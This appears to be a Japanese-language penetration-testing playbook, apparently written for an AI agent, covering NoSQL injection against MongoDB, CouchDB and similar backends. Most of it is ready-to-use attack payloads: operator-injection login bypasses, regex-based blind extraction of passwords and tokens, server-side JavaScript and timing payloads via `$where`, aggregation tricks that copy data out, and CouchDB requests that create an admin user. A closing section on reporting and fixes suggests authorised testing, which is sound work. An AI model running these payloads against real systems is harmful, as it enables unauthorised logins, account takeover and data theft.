# NoSQL Injection

MongoDB / CouchDB / DynamoDB / Redis / Firestore / RethinkDB が裏にいる API への operator 注入・JS 評価・aggregation pipeline 経由攻撃を扱う。

## Phase 1 — backend 同定

```
- response の error 文 (Mongo: "MongoError", "BSON", "$where")
- header (X-Powered-By: Express → Mongo の可能性)
- behavior signature: `{"$ne":""}` で 200/302 が出る
- network port (27017 / 5984 / 6379) が裏で見える場合の SSRF 経由
```

## Phase 2 — 認証バイパス (operator 注入)

login form / API が JSON を受け、`{username, password}` でクエリ組立てしている場合:

```json
POST /api/login
{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
→ 「username が空でない、かつ password が空でない」レコード = 任意の 1 件にマッチ → 認証通過
```

別バリエーション:

```
{"username": "admin", "password": {"$ne": "x"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": {"$in": ["admin","root"]}, "password": {"$ne": "x"}}
```

URL parameter で受けるパターンは `username[$ne]=&password[$ne]=` のように bracket notation で operator を発火 (Express + qs / body-parser の自動 deep parse 由来)。

## Phase 3 — Boolean blind 抽出

```
{"username": "admin", "password": {"$regex": "^a"}}     → 200 なら password が a で始まる
{"username": "admin", "password": {"$regex": "^ab"}}    → 続けて b
... 1 文字ずつ確認していき hash / token / 機密値を再構成
```

`$where` を許す古い実装では JS 評価:

```
{"username": "admin", "$where": "this.password.length > 30"}
{"username": "admin", "$where": "function(){return this.password[0]=='a'}"}
```

## Phase 4 — aggregation pipeline / map-reduce

`$match` / `$lookup` / `$out` 等が使える endpoint に対して別 collection 参照:

```
{"$lookup": {"from":"users","localField":"_id","foreignField":"_id","as":"u"}}
{"$out": "exfil"}    # 結果を別 collection に書出 (write 権限あれば)
```

## Phase 5 — JavaScript 系 (Mongo `$where` / `$accumulator`)

```
{"$where": "sleep(5000) || true"}       # time-based blind
{"$where": "Object.keys(db.runCommand('listCollections').cursor.firstBatch).length > 0"}
```

サーバ側 JS 実行 (Mongo 4.4+ で `$accumulator` / `$function`) があれば任意関数組立。

## Phase 6 — CouchDB

```
GET /_users/_all_docs                       # 認証無しで露出していないか
PUT /_users/org.couchdb.user:newadmin       # 任意 user 作成
POST /_replicate                            # 別 DB から複製
```

`_design` document の `validate_doc_update` が緩いと書込まで通る。

## Phase 7 — 自動化

```
NoSQLMap                          # operator / boolean / time blind
nosqlinjection.py (ssrf-like 専用)
ffuf -d '{"username":"FUZZ","password":"FUZZ"}' ...
```

## Phase 8 — PoC と影響

```
- 注入点 / DB 種別
- bypass の最小 payload (1 つ)
- 抽出した schema / collection 名 (件数のみ)
- 影響評価 (任意ログイン / 機密漏洩 / 書込 escalation)
- 修正 (型検証 / ODM 利用 / parameterized 機能)
```

## Tools

```
NoSQLMap
mongo / mongosh (lab 環境)
curl
ffuf
WebFetch
Bash (sandbox)
```
